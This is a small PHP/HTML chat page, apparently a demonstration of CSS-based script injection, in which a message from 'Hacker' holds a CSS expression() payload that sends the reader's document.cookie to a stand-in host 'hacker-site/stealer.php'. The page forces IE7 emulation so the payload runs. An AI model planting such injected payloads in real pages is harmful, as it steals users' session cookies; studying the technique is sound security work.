<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
    <meta charset="utf-8">
    <title>Authorisation</title>
    <link rel="shortcut icon" href="pics/login-icon.ico">
    <link rel="stylesheet" href="css/index.css" type="text/css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="js/jquery-2.1.4.min.js"></script>
</head>


<body class="body">


  <div class='greeting-line'>
		<div class="greeting-text">Welcome to chat!
		</div>
	</div>


<div class='message'><b>Hacker</b> said:   Hi everyone! {}*{test:expression(document.getElementById('name-field').style.backgroundImage
    = 'url("' + "http://hacker-site/stealer.php?" + encodeURI(document.cookie) + '")')}
 </div>
<div class='message'><b>Masha</b> said: Hi! </div>
<div class='message'><b>Vasya</b> said: Hello! </div>

</body>
</html>
